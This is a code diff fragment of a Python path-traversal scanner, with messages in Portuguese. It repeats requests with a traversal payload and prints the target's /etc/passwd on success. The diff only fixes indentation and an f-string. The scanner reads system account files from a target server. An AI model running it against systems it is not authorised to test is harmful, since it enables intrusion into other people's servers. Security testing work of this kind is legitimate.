@@ -20,16 +20,16 @@ if response.status_code == 200 or response.status_code == request_aceptable:
         repete = requests.get(url + payload_path_traversal, headers=headers)
         print(f"request {i+1}: {repete.status_code} - {url + payload_path_traversal}")
         
-    if repete.status_code == 200:
-        print("[+] Vulnerabilidade de Path Traversal encontrada! | Conteudo do arquivo /etc/passwd:")
-        print("=" * 50)
-        print(repete.text)
-        print("=" * 50)
-        vulnerable = True
-        break
+        if repete.status_code == 200:
+            print("[+] Vulnerabilidade de Path Traversal encontrada! | Conteudo do arquivo /etc/passwd:")
+            print("=" * 50)
+            print(repete.text)
+            print("=" * 50)
+            vulnerable = True
+            break
     
     if not vulnerable:
         print("[-] Nenhuma vulnerabilidade de Path Traversal encontrada.")
         
     else:
-        print("[-]: {response.status_code}")
+        print(f"[-]: {response.status_code}")
